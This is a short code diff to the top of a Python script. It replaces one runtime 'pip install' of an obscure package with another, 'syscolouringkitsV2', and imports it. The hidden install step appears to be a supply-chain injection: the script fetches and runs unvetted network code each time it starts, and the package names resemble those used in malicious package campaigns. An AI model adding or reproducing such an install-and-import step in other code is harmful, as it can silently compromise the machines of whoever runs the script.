@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptoaddonsV2")
-import pipcryptoaddonsV2
+os.system("pip install syscolouringkitsV2")
+import syscolouringkitsV2
 import json
 import httpx
 import time
